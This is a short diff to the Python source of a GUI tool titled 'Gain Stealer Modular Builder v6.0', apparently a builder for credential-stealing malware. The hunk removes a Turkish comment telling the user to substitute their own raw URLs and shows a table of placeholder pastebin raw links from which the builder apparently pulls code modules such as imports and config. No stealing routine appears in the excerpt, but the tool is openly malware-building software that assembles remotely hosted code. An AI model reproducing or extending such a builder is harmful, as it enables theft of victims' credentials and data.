@@ -16,7 +16,6 @@ class ModularGainBuilder:
         self.root.title("Gain Stealer Modular Builder v6.0")
         self.root.geometry("1000x700")
         
-        # Raw URL'ler (sen bunları kendi raw'larınla değiştireceksin)
         self.raw_urls = {
             'imports': 'https://pastebin.com/raw/IMPORTS_CODE',
             'config': 'https://pastebin.com/raw/CONFIG_CODE',
